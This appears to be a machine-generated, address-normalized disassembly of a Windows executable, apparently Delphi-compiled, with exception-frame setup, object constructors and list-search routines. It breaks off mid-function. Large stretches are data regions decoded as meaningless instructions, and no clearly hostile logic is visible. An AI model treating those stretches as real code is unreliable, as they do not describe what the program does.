call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4111ce
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4111d5
retn
mov eax rw-data
call sub_403e54
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048dc
sub_4111e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411205
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41120c
retn
sub_411ac5
dec eax
inc esp
inc ecx
add [ eax ] bl
inc esp
inc ecx
add [ ebx ] cl
push esp
push eax
jb r-xdata
add [ esi + 0x29 ] al
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
movsb [ edi ] [ esi ]
sbb eax [ ecx ]
xor eax 0x411b
imul esi [ ebx + 0x74 ] 0x8b746e65
shl al 0x1a
inc ecx
add [ edi ] al
or edx [ eax + edx * 2 + 0x65 ]
jb r-xdata
add [ eax ] al
add [ ebx + ebx + 0x1be00041 ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
sbb eax [ ecx ]
or al 0x0
add [ eax ] al
push 0x4c00411a
xor eax [ eax ]
int3
inc ecx
add [ 0x411b ] dh
imul esi [ ebx + 0x74 ] 0xb4746e65
sbb al [ ecx ]
hlt
sub_411d54
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc esp
outsb
dec ecx
je r-xdata
add [ eax - 0xbffbfd0 ] bh
imul ebp [ esi + 0x67 ] 0x7473694c
push 0x700411e
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
dec eax
inc ecx
add [ edi + eax * 2 ] bh
inc ecx
add [ eax ] bl
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] cl
add [ eax + 0x56 ] dl
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax ] ch
dec ebx
inc ecx
add al cl
push edi
inc ecx
add [ eax + ebx * 2 ] ah
inc ecx
add al bh
pop eax
inc ecx
add al ch
push ecx
inc ecx
add [ ecx + ebx * 2 ] dh
inc ecx
add [ eax - 0x33ffbea7 ] ch
push ebx
inc ecx
add al bl
push ebx
inc ecx
add [ esi + eax * 2 + 0x54740041 ] al
inc ecx
add [ esp + edx * 2 + 0x55200041 ] dh
inc ecx
add ah dl
dec edx
inc ecx
add [ eax - 0x23ffbeaa ] dh
dec esp
inc ecx
add [ eax - 0x13ffbeb3 ] dh
push esi
inc ecx
add ah bh
push esi
inc ecx
add [ esi + ecx * 2 ] dl
inc ecx
add [ eax + 0x4e ] ch
inc ecx
add [ edi + ecx * 2 ] dl
inc ecx
add [ eax + edx * 2 + 0x51040041 ] ch
inc ecx
add [ eax + 0x3c004151 ] bl
push esp
inc ecx
add [ eax + 0x54 ] bl
inc ecx
add [ eax + 0x57 ] dl
inc ecx
add [ eax + 0x60004155 ] ah
pop ecx
inc ecx
add [ eax + 0x59 ] dh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
rcr [ 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] bl
inc ecx
add [ eax ] dh
add [ eax ] al
add [ esp + ebx + 0x41 ] al
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0x53 ] dh
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ eax + ecx * 2 + 0x41 ] al
add al bh
popad
clc
pop ecx
inc ecx
add [ edx + ebx * 2 + 0x41 ] al
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add ah bh
pop edx
inc ecx
add [ eax + 0x700415b ] al
push esp
push ebx
je r-xdata
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub al 0x1d
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
in al 0x1f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx ] al
or [ eax ] al
add [ eax ] al
and [ edi ] bl
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] dl
pushad
inc ecx
add al bh
pop ecx
inc ecx
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax + 0x5e ] dl
inc ecx
add al dh
pop ebp
inc ecx
add [ eax ] al
pop esi
inc ecx
add ah bh
pop edx
inc ecx
add [ eax ] dl
pop esi
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
popad
insd
fcomp [ esi ]
inc ecx
add ah dh
adc [ eax ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
pop eax
and [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
popad
inc eax
add [ eax - 0xbffbfd0 ] bh
xor [ eax ] al
clc
pop ecx
inc ecx
add [ edx + ebx * 2 + 0x41 ] al
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x41 ] cl
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x5b800041 ] al
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ eax ] dl
add [ eax ] al
add [ esi + ebx + 0x334c0041 ] cl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
insb
push ebx
je r-xdata
outsb
jae r-xdata
pop ecx
inc ecx
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax + 0x5e ] dl
inc ecx
add al dh
pop ebp
inc ecx
add [ eax ] al
pop esi
inc ecx
add ah bh
pop edx
inc ecx
add [ eax ] dl
pop esi
inc ecx
add [ 0x6e614854 ] cl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
clc
insd
add [ edi ] bl
inc ecx
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
popad
xor [ eax ] al
add [ ebp + 0x1ed80040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
push ds
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
jns r-xdata
push ebx
je r-xdata
sbb [ ebx + 0x41 ] 0x0
js r-xdata
je r-xdata
add [ ebp + 0x1f6c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800411f ] cl
add [ eax ] al
add [ esi + ebx + 0x334c0041 ] cl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
clc
pop ecx
inc ecx
je r-xdata
insd
outsd
jb r-xdata
popad
insd
aam 0x20
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
and [ ecx ] al
adc al 0x0
add [ eax ] al
or al 0x20
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x7ffbea0 ] ch
pop ecx
inc ecx
add [ ecx + 0x41 ] cl
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x41 ] cl
add [ edx ] al
inc ecx
add [ eax + 0x5b800041 ] al
inc ecx
add [ eax + 0x61 ] bh
add [ eax + 0x63 ] ch
inc ecx
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax - 0x27ffbe9e ] bl
bound eax [ ecx ]
adc [ ebx + 0x41 ] ah
add [ eax + 0xe00415b ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + 0x7800415b ] al
popad
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
push eax
and [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
and [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
fsub [ ecx ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
and [ ecx ] eax
sbb [ eax ] al
add [ eax ] al
or al 0x20
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x7ffbe9c ] bh
pop ecx
inc ecx
add [ edx + ebx * 2 + 0x41 ] al
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x41 ] cl
add al dh
inc ecx
add [ eax + 0x5b800041 ] al
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
push ebx
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
add [ eax - 0xbffbfd0 ] bh
xor [ eax ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ esi ] ds
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_41231c
mul [ edx ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004123 ] dl
add [ eax ] al
add [ ecx + edx + 0x334c0040 ] dl
inc eax
add [ ebp + edx * 2 + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
or al 0x0
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] bl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x50004030
inc ecx
add [ eax + 0x65 ] bh
inc ecx
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x4124ac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
and al 0x41
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax + eax ] bh
add ah bh
and eax [ ecx ]
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x10004030
insb
inc ecx
add [ eax + 0x65 ] bh
inc ecx
add [ eax + 0x6c ] dh
inc ecx
add [ esp + ebp * 2 + 0x6fb80041 ] ah
inc ecx
add [ ebp + ebp * 2 - 0x713fffbf ] dl
inc ecx
add [ ebp + ebp * 2 - 0x706fffbf ] dh
inc ecx
add [ eax - 0x71 ] bh
inc ecx
add ah dh
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x24 al
inc ecx
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
pop es
inc ebp
push esp
push 0x64616572
dec eax
and eax 0xe0a0041
push esp
inc ebx
outsd
insd
jo r-xdata
sar [ 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
and eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] eax
dec esp
xor eax [ eax ]
je r-xdata
in al dx
and eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
and eax [ ecx ]
or [ eax ] al
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x48004030
xor eax [ ecx ]
or al 0x54
inc ebx
insb
popad
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp sub_41a024
popad
insd
pop esp
and eax 0xf0f0041
dec ecx
inc esp
jae r-xdata
nop
add [ eax + 0x60004055 ] al
xor eax [ eax ]
push esp
xor eax [ eax ]
nop
push ebp
inc eax
add [ eax - 0x6bffbfd0 ] bh
mov [ 0xffffffffa3cc0041 ] eax
inc ecx
add [ esp ] dh
inc ecx
add [ esp - 0x5adfffbf ] bl
inc ecx
add [ ebp - 0x587bffbf ] al
inc ecx
add [ eax - 0x63ffbe59 ] dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x4bffbe59 ] ch
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
test al 0x41
add [ esi ] cl
push esp
push ebx
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x24
inc ecx
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax + 0x24 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xd4
jmp sub_41a024
outsb
jb r-xdata
jmp sub_41a044
outsd
je r-xdata
inc esp
and al 0x4
aam 0xe9
jpe r-xdata
jns r-xdata
add ah cl
cdq
and eax 0x25a70041
inc ecx
add [ ecx - 0x6effbedb ] dh
and eax 0x25bb0041
inc ecx
add cl cl
and eax 0x25d30041
inc ecx
add [ edx ] al
pop es
inc ebx
insb
popad
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7dee9
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1

add bh bh
sub_4126e3
push ecx
push eax
[ eax - 0x64 ]
inc ecx
add [ eax - 0x64 ] ah
inc ecx
add [ esp + ebx * 4 + 0x41 ] ah
add [ esp + ebx * 4 + 0x41 ] bh
add [ eax - 0x7fffbe64 ] dh
pushfd
inc ecx
add [ eax - 0x73ffbe64 ] cl
pushfd
inc ecx
add [ eax + 0x4400419c ] bl
popfd
inc ecx
add [ eax - 0x63 ] bl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ esp + ebx * 4 - 0x6397ffbf ] al
inc ecx
add [ esp + ebx * 4 + 0x41 ] dl
add [ edi + ebx * 4 + 0x540a0041 ] bl
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x28
outsb
outsb
je r-xdata
add [ eax ] al
mov [ 0xffffffff9cb40041 ] al
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
cmp [ edi ] ah
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
inc ecx
add [ ebp + ebx * 4 - 0x6023ffbf ] ch
mov ah 0x9c
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ ecx + 0x41 ] bl
add al al
mov [ 0xffffffffa2640041 ] al
inc ecx
add al bh
mov eax [ 0xffffffffa2280041 ]
inc ecx
add ah bh
mov eax [ 0xffffffffa2480041 ]
inc ecx
add [ ecx ] al
add bh ch
[ edx ]
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x6400408d
sub [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4128 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
sub [ ecx ] al
mov ah 0x28
inc ecx
add [ eax + eax ] dl
add [ eax ] bh
inc ecx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0xc0041a1 ] ah
inc esp
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x5dffffbf ] ah
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xb0004030
mov al [ 0xffffffffa0ac0041 ]
inc ecx
add ah ah
mov al [ 0xffffffffa1440041 ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp ] al
outsb
outsb
je r-xdata
inc ecx
add ah bl
sbb al [ ecx ]
add al [ eax ]
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax ] bl
mov eax [ 0xffffffffa1480041 ]
inc ecx
add [ eax - 0x60 ] ch
inc ecx
add ah bh
mov al [ 0xffffffffa1500041 ]
inc ecx
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x53ffbe60 ] dh
mov al [ 0xffffffffa0e40041 ]
inc ecx
add [ ecx + 0x41 ] al
jae r-xdata
and eax 0x80041
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
in al 0x27
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x41 ] al
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
sub_412910
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d08
pop edi
pop esi
pop ebx
retn
sub_412938
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405cec
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412960
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d10
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412a58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413d6c
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403330
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403330
test al al
je r-xdata
sub_412ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412a58
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412a58
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403330
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412b28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413c10
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_412ba4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
mov eax [ esi + 0x4 ]
call sub_403104
mov eax [ esi + 0x8 ]
call sub_403104
mov eax [ esi + 0xc ]
call sub_403104
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_412be4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413d6c
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403068
test al al
jne r-xdata
sub_412c44
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413d6c
mov edx eax
mov eax ebp
call sub_403330
test al al
jne r-xdata
sub_412c88
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412d23
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403054
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040b8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412be4
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d2a
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
sub_412d48
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404e78
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_412d68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
